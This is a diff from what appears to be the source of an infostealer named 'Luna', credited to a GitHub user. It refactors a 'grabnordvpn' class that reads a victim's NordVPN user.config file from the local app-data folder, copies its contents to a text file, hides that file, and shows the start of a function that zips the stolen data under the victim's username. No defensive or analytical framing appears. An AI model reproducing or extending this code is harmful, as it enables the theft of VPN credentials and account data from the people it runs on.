@@ -485,22 +485,23 @@ class epicgames_data():
 
 @try_extract
 class grabnordvpn():
-     def __init__(self):
-        self.appdata = os.getenv("localappdata")
+    def __init__(self):
+        self.local = os.getenv("localappdata")
+        self.nord = self.local + "\\NordVPN\\NordVPN.exe_Path_ocgnpsstpzc4lj3yc2lnr1cf1hyyhdd5\\6.35.9.0\\user.config"
+                
+        self.get_data()
+        
+    def get_data(self):
+        with open((".\\nordvpn-data.txt"), 'w', encoding="cp437", errors='ignore') as f:
+            f.write("https://github.com/Smug246 | Nord VPN Data\n\n")
+            if os.path.exists(self.nord):
+                with open(self.nord, 'r') as n:
+                    f.write(n.read())
+                    
+            else: 
+                f.write(f"No nord vpn data was found :(")
 
-        try:
-            with open((".\\nordvpn-data.txt"), 'w', encoding="cp437", errors='ignore') as f:
-                f.write("https://github.com/Smug246 | Nord VPN Data\n\n")
-                f.write("Nord Vpn Data Found:\n")
-
-                nord_path = open((self.appdata + "\\NordVPN\\NordVPN.exe_Path_ocgnpsstpzc4lj3yc2lnr1cf1hyyhdd5\\6.35.9.0\\user.config")).read()
-                f.write(nord_path)
-                hide(".\\nordvpn-data.txt")
-        except Exception as e:
-            with open((".\\nordvpn-data.txt"), 'w', encoding="cp437", errors='ignore') as f:
-                f.write("https://github.com/Smug246 | Nord VPN Data\n\n")
-                f.write(f"No nord vpn data was found :(\n{e}")
-                hide(".\\nordvpn-data.txt")
+        hide(".\\nordvpn-data.txt")
 
 def zipup():
     with ZipFile(f'Luna-Logged-{os.getenv("Username")}.zip', 'w') as zipf:
